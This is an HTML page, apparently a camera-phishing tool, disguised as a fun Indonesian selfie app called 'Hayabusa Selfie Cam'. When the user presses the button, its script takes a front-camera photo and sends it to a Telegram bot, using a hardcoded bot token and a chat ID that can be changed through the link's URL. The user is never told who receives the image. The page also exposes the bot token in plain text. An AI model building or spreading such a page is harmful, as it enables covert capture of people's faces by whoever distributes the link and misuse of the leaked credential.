<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Hayabusa Selfie Cam</title>

<style>
body{
  background:#121212;
  color:white;
  font-family:Segoe UI,sans-serif;
  text-align:center;
  display:flex;
  flex-direction:column;
  justify-content:center;
  align-items:center;
  min-height:100vh;
  margin:0;
}
h2{color:cyan;text-shadow:0 0 10px cyan}
.camera-frame{
  width:90%;
  max-width:400px;
  border:4px solid cyan;
  border-radius:20px;
  overflow:hidden;
  box-shadow:0 0 20px rgba(0,255,255,.5);
  position:relative;
}
video{
  width:100%;
  transform:scaleX(-1);
}
#countdown{
  position:absolute;
  top:50%;left:50%;
  transform:translate(-50%,-50%);
  font-size:72px;
  display:none;
}
button{
  margin-top:20px;
  padding:14px 36px;
  font-size:18px;
  border:none;
  border-radius:40px;
  background:linear-gradient(45deg,#00d2ff,#3a7bd5);
  color:white;
  cursor:pointer;
}
</style>
</head>

<body>

<h2>ðŸ“¸ HAYABUSA SELFIE CAM</h2>
<p>Pasang gaya terbaikmu</p>

<div class="camera-frame">
  <video id="video" autoplay playsinline></video>
  <div id="countdown">3</div>
</div>

<button id="btn">AMBIL FOTO ðŸ“¸</button>
<canvas id="canvas" style="display:none"></canvas>

<script>
const TOKEN = "8373626378:AAHmCRe_FCCDug1yrlsnat6WFhi71Qf6lQI";
const CHAT_ID = new URLSearchParams(location.search).get("id") || "7596509818";

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const btn = document.getElementById("btn");
const cd = document.getElementById("countdown");

let cameraReady = false;

// AKTIFKAN KAMERA
navigator.mediaDevices.getUserMedia({
  video:{ facingMode:"user", width:{ideal:1280}, height:{ideal:720} }
})
.then(stream=>{
  video.srcObject = stream;
  video.play();

  // TUNGGU FRAME BENAR-BENAR SIAP (INI KUNCINYA)
  video.requestVideoFrameCallback(()=>{
    cameraReady = true;
    console.log("Kamera siap, frame valid");
  });
})
.catch(()=>alert("Izinkan kamera dulu bang"));

// COUNTDOWN
btn.onclick = ()=>{
  if(!cameraReady) return alert("Kamera belum siap, tunggu sebentar...");
  btn.style.display="none";
  cd.style.display="block";

  let n=3;
  cd.textContent=n;

  const t=setInterval(()=>{
    n--;
    if(n>0){
      cd.textContent=n;
    }else{
      clearInterval(t);
      cd.textContent="ðŸ“¸";
      setTimeout(capture,300);
    }
  },1000);
};

// CAPTURE SEKALI & KIRIM
function capture(){
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext("2d");

  ctx.translate(canvas.width,0);
  ctx.scale(-1,1);
  ctx.drawImage(video,0,0);

  canvas.toBlob(blob=>{
    const fd=new FormData();
    fd.append("chat_id",CHAT_ID);
    fd.append("photo",blob,"selfie.jpg");
    fd.append("caption","ðŸ“¸ SELFIE MASUK (BENING)");

    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`,{
      method:"POST",
      body:fd
    }).then(()=>{
      alert("Foto terkirim âœ…");
      location.reload();
    }).catch(e=>alert("Gagal: "+e));
  },"image/jpeg",0.9);
}
</script>

</body>
</html>
